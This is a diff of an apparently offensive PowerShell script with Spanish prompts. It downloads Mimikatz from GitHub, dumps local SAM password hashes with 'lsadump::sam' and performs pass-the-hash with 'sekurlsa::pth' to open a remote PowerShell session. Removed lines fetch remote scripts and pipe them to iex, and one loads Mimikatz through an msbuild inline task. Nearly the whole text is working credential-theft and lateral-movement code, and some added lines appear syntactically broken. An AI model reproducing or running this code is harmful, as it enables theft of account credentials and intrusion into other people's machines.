@@ -83,18 +83,16 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip
-	if($system -in '32 bits') { .\mimikatz\Win32\mimikatz.exe }
-	if($system -in '64 bits') { .\mimikatz\x64\mimikatz.exe }
-        del .\mimikatz\ , .\mimikatz.zip -Confirm:$false
 	Write-Host ""
         $hash = Read-Host -Prompt 'Quieres usar un hash local?'
 	Write-Host ""
         if($hash -like 's*') { 
         Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
         Write-Host ""
+	if($system -in '32 bits') { $mimipath = .\mimikatz\Win32\ }
+	if($system -in '64 bits') { $mimipath = .\mimikatz\x64\ }
 	$Host.UI.RawUI.ForegroundColor = 'Yellow'
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1" -UseBasicParsing | iex
-        Get-PassHashes 2> $null
+	$mimipath\mimikatz.exe "privilege::debug" "lsadump::sam" 
         $Host.UI.RawUI.ForegroundColor = 'Gray'
 	Write-Host ""}
         $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
@@ -151,11 +149,9 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
         
       } until ($input -in '1','2','3','4')
 
-
-if(Test-Path variable:global:PassTheHash) { Invoke-WebRequest -Uri "https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" -Outfile SimpleTasks.csproj
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ; sekurlsa::pth /user:$user /ntlm:$hash /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" } 
-else { Write-Host ""
-$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+Write-Host ""
+if(Test-Path variable:global:PassTheHash) { $mimipath\mimikatz.exe sekurlsa::pth /user:$user /ntlm:$hash /run:"powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" }
+else { $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
 $Host.UI.RawUI.ForegroundColor = 'Yellow'
 Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
